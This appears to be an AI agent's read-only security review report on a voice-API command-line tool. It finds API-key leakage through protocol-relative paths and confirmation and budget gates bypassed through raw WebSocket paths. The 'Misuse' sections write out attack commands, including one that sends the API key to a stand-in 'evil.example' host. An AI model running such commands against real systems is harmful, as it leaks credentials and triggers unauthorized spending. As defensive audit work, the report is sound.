=== completionReport ===
I'll start with a skill triage for this read-only security review, then map the `a9de3c2..HEAD` diff and probe trust boundaries without mutating anything.Skills loaded: `elv` (contract/safety) and `agentfit` (agent-surface gates). Next I'll map the post–Round 1 security surfaces from the diff and source.Reading security-critical modules and Round 1 findings next.Round 1 raised the dry-run cache write; I'll verify that fix and probe the remaining trust boundaries.Checking a critical URL resolution footgun: path values like `//evil.com/...` against `new URL(path, baseUrl)`.## Skills applied

| Skill | Use |
| --- | --- |
| `elv` | Safety contract: auth routing, `--yes`, budget, dry-run, secrets |
| `agentfit` | Agent-facing gate honesty (gates that can be walked around fail the contract) |
| Others | Not loaded — this is a security/trust-boundary review, not agentfit/docs work |

**Mode:** Delegate Grok safe / read-only. No files mutated. No `node_modules` in this copy; probes were Node URL resolution + source/test reading (not a live `elv` binary run).

**Range reviewed:** `a9de3c2..HEAD` (incl. `a6ffd31` Round 1 fixes), plan workstreams C/F/G, tests under `tests/commands/http*`, `tests/ws/*`, `tests/core/secret*`, `tests/commands/spec-cli-dry-run*`.

---

# Round 2: security and trust boundaries

## Finding 1 — CRITICAL: protocol-relative paths send `xi-api-key` off-host

**Evidence**

- `src/commands/http.ts:92-96` — only requires `path.startsWith("/")` (so `//evil…` is accepted).
- `src/core/request-builder.ts:90-98` — `new URL(path, baseUrl)` then always sets `xi-api-key` when a key is present.
- `src/commands/ws.ts:174-179` — any target starting with `/` is treated as a raw path with **`usesProfileAuth: true`**.
- `src/ws/catalog.ts:108-109` — same `new URL(path, wsBase(baseUrl))` resolution.

**Verified resolution behavior (Node):**

| Input path | Resolved host |
| --- | --- |
| `/v1/user` | `api.elevenlabs.io` |
| `//evil.example/steal` | **`evil.example`** |
| `///evil.example/x` | **`evil.example`** |

**Misuse**

```bash
# REST: profile key leaves the configured ElevenLabs host
elv http GET '//evil.example/exfil'

# WS: same class of target is classified as a "path", so profile auth is attached
elv ws '//evil.example/drain' --send script.ndjson
```

Plan F4 says absolute `ws://`/`wss://` must never get the profile key. Protocol-relative `//host` is not that form, but `new URL` still rebinds the host while auth stays on.

**Smallest fix**

1. Reject request paths that start with `//` (and any path that `URL` resolves to a different origin than `baseUrl`).
2. After building the request URL, assert `url.host === baseHost` (HTTP) / same for WS after scheme map; if not equal, either refuse or treat as absolute escape hatch **without** profile auth (WS only).
3. Add tests: `//evil…` never calls `fetch`/connect with `xi-api-key`; dry-run still validates.

---

## Finding 2 — HIGH: raw WS paths bypass `--yes` for monitor/agent outbound

**Evidence**

```274:274:src/commands/ws.ts
    requiresYes: outboundActions > 0 && entry?.outboundRisk !== undefined,
```

`entry` is only set for catalog **names**. Raw paths (`/v1/…`) have `entry === undefined` → `requiresYes` is always false, while profile auth remains true (`ws.ts:179`).

Catalog entries that *do* gate: `convai` / `convai-monitor` (`src/ws/catalog.ts:59,69`).

Tests only cover catalog names (`tests/ws/ws-session.test.ts:238-283`), not path aliases.

**Misuse**

```bash
# Gated:
elv ws convai-monitor --query conversation_id=CONV --send end_call.ndjson
# → exit 4, never connects

# Bypass with profile key still attached:
elv ws '/v1/convai/conversations/CONV/monitor' --send end_call.ndjson
# → connects and can end/transfer/take over without --yes
```

Same pattern for `/v1/convai/conversation` (agent outbound messages). Violates plan F3 (“Require `--yes` for monitor … and scripted agent-conversation messages”).

**Smallest fix**

When resolving a raw path, match it against catalog `pathTemplate`s (same specificity rules as HTTP). Inherit `outboundRisk` / `protocol`. If path matches a gated catalog surface and the script has outbound actions, require `--yes`. Add a regression test that path form fails like the catalog form.

---

## Finding 3 — HIGH: raw WS paths bypass STT/agent budget fail-closed

**Evidence**

```248:263:src/commands/ws.ts
  const protocol = entry?.protocol ?? "raw";
  ...
  const estimateUnavailable = protocol === "stt" || protocol === "convai";
  const budgetPolicy =
    maxCredits === undefined
      ? "not_configured"
      : creditsEstimated !== null
        ? "bounded"
        : estimateUnavailable
          ? "estimate_unavailable"
          : "unknown_unbounded";
```

Catalog STT with ceiling → exit 5 (`tests/ws/ws-session.test.ts:340-355`).
Same socket as a raw path → `protocol: "raw"` → `unknown_unbounded` → **proceeds**.

**Misuse**

```bash
elv ws stt-realtime --send stt.ndjson --max-credits 1
# exit 5, no connect

elv ws '/v1/speech-to-text/realtime' --send stt.ndjson --max-credits 1
# budget_policy unknown_unbounded → connects and can spend
```

Same for `/v1/convai/conversation` under a ceiling.

**Smallest fix**

Same catalog-template inheritance as Finding 2 for `protocol` (and thus `estimateUnavailable`). Test path form fails closed identically to catalog form.

---

## Finding 4 — MEDIUM: LiveKit-style camelCase credential keys miss shape detection

**Evidence**

- `containsCredential` / `isCredentialKey` (`src/core/redaction.ts:21-40`) know `access_token`, not `accessToken`.
- Probe: `{"livekit":{"accessToken":***}}` → **not** credential-shaped.
- Mitigated for curated ops via `secretResult` (`src/openapi/compile-spec.ts:197-200`: `get_livekit_token`, etc.).
- Plan G1 asked for “documented LiveKit/WebRTC credential fields” on the **key set**, not only curated op IDs.

**Misuse**

Any non-`secretResult` success JSON that returns `accessToken` / similar camelCase fields is inlined on stdout (and not 0600-spilled).

**Smallest fix**

Normalize keys (`toLowerCase` + strip `_`) before membership checks, or add explicit camelCase aliases (`accesstoken`, `refreshtoken`, …). Extend `tests/core/secret-results-expansion.test.ts`.

---

## Disproved / residual (not findings)

| Claim | Result |
| --- | --- |
| Round 1: `spec update --dry-run` still writes cache | **Fixed** (`src/cli.ts` uses `mergedOptions`; `tests/commands/spec-cli-dry-run.test.ts`) |
| Round 1: `json_events` escape bug | **Fixed** (`response-normalizer` `char === "\\"`) |
| Absolute `wss://` gets profile API key | **Disproved** (`ws.ts:174-179`, `ws-session.test.ts:117-135`) |
| Catalog monitor without `--yes` connects | **Disproved** (gated; test proves no connect) |
| Matched HTTP TTS ignores character budget | **Disproved** (`http-metadata-budget.test.ts` inheritance) |
| Secret spill not 0600 / `view` leaks canary | **Disproved** (`secret-results-expansion.test.ts`) |
| `call` path params open-redirect via `{id}=//evil` | **Disproved** (`encodeURIComponent` in `resolvePath`) |
| Catalog STT/convai fail-closed under ceiling | **Holds** (only raw-path form breaks it) |
| `--base-url` sends key to that host | **By design** (proxy/residency); not a bug if the operator sets it |
| Non-generate `unknown_unbounded` under ceiling | **Documented intentional** residual |
| Unsigned/local registry cache trust | Residual multi-user poison risk; not a new logic bug in this diff |
| `create_service_account` not in `SECRET_RESULT_OP_IDS` | Shape detection covers `api_key`; acceptable with Finding 4 hardening |

---

## Verdict: **reject**

Do not ship this expansion until **Finding 1** is fixed (API-key host binding). Findings **2–3** break the stated `--yes` and budget fail-closed contracts via trivial path aliases and should land in the same patch set. Finding **4** can ride along as a small redaction hardening.

Suggested gate after fixes: unit tests for `//evil` URL binding + raw-path monitor/STT parity with catalog; re-run `tests/commands/http*`, `tests/ws/*`, `tests/core/secret*`.

---

## Delegate completion report

- **Status:** completed (read-only)
- **What I found:** One critical API-key host rebinding via protocol-relative paths; two high WS raw-path gate/budget bypasses; one medium camelCase credential gap. Round 1 dry-run/json_events issues verified fixed.
- **Files reviewed:** `src/commands/{http,ws,view,spec}.ts`, `src/core/{client,request-builder,redaction,budget,files,safety,response-normalizer,error-normalizer,config,wait-operation}.ts`, `src/ws/*`, `src/openapi/{fetch-spec,registry,risk,compile-spec}.ts`, plan + Round 1 review, security-relevant tests listed above
- **Verification:** Source-level + Node URL probes + test reading; full vitest suite **not** run (no `node_modules` in this workspace copy)
- **Remaining risks:** intentional `--base-url`/unsigned cache trust; non-generate `unknown_unbounded`; operator-chosen `--save-json` paths for secrets (0600 at destination, still user-controlled location)
- **Files changed:** none
